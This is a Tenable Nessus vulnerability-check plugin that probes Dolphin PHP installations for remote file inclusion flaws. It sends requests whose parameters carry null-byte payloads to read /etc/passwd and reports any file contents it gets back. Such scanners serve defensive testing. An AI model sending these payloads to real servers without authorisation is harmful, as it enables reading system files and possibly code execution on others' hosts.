#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33446);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/19 17:45:44 $");

  script_cve_id("CVE-2008-3167", "CVE-2008-3166");
  script_bugtraq_id(30136);
  script_osvdb_id(46848, 46861, 46862);
  script_xref(name:"EDB-ID", value:"6024");
  script_xref(name:"Secunia", value:"30981");

  script_name(english:"Dolphin Multiple Scripts Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Dolphin, a web-based social networking
application written in PHP. 

The version of Dolphin installed on the remote host fails to sanitize
user-supplied input to the 'dir[plugins]' parameter of
'plugins/safehtml/HTMLSax3.php' and 'plugins/safehtml/safehtml.php'
scripts as well as the 'sIncPath' parameter of the
'ray/modules/global/inc/content.inc.php' script before using it to
include PHP code.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit this issue
to view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/07/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:boonex:dolphin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded:0, php:TRUE);


file = "/etc/passwd";
file_pat = "root:.*:0:[01]:";
if (thorough_tests) 
{
  exploits = make_list(
    string("/plugins/safehtml/HTMLSax3.php?dir[plugins]=", file, "%00"),
    string("/plugins/safehtml/safehtml.php?dir[plugins]=", file, "%00"),
    string("/ray/modules/global/inc/content.inc.php?sIncPath=", file, "%00")
  );
}
else 
{
  exploits = make_list(
    string("/plugins/safehtml/HTMLSax3.php?dir[plugins]=", file, "%00")
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/dolphin", "/boonex", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
info = "";
foreach dir (dirs)
{
  # Try various exploits.
  foreach exploit (exploits)
  {
    url = string(dir, exploit);

    r = http_send_recv3(method: "GET", item:url, port:port);
    if (isnull(r)) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:file_pat, string:r[2]) ||
      # we get an error because magic_quotes was enabled or...
      string("(", file, "\\0safehtml/") >< r[2] ||
      # we get an error claiming the file doesn't exist or...
      string("(", file) >< r[2] ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< r[2]
    )
    {
      info += '  ' + build_url(port:port, qs:url) + '\n';

      if (!contents && egrep(pattern:file_pat, string:r[2]))
      {
        contents = r[2];
      }
    }
  }
  if (info && !thorough_tests) break;
}


if (info)
{
  if (report_verbosity)
  {
    if (max_index(split(info)) > 1) s = "s";
    else s = "";

    report = string(
      "\n",
      "The following URL", s, " appear exploitable :\n",
      "\n",
      info
    );
    if (contents && report_verbosity > 1)
      report = string(
        report,
        "\n",
        "And here are the contents of the file '", file, "' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
